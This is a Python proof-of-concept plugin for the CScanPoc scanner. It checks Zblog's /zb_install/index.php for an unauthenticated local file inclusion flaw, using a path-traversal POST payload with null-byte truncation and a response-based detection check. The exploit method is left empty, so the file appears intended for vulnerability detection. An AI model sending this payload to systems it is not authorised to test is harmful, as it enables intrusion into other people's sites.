# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'a4314a64-4a20-4c2a-a02f-64103a710088'
    name = 'Zblog前台无需登录包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        Zblog /zb_install/index.php 前台无需登录包含漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3213/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '70f4b885-d3a5-4e84-acbe-9b03a8a3db6d'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/zb_install/index.php' 
            postpayload = 'zbloglang=../../zb_system/image/admin/none.gif%00'
            url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(' -d "%s" "%s"' % (postpayload,url))
                       
            if code == 500 and 'Cannot use a scalar value' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()